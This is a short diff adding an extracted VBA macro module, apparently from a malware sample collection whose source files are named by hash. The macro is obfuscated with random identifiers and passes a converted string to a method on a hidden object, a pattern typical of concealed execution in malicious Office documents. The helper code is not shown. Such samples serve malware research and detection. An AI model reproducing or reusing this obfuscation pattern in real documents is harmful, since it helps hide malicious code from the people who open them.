@@ -1,0 +1,17 @@
+Filename     : ./macros/a1582c25d9badb8b00bb4bfbdd2bd3080b86e12e91af52a3bdaf62cf5796be9d
+OLE stream   : Macros/VBA/RSi4l1e
+VBA filename : RSi4l1e.bas
+----------------------------------------
+Attribute VB_Name = "RSi4l1e"
+Sub successfull(ywJAraKCI)
+
+
+
+Yd1wPT = CadAYgTe(ywJAraKCI)
+
+
+Call w4jgOkDTW.La15S(StrConv(Yd1wPT, 64), 0)
+
+
+
+End Sub
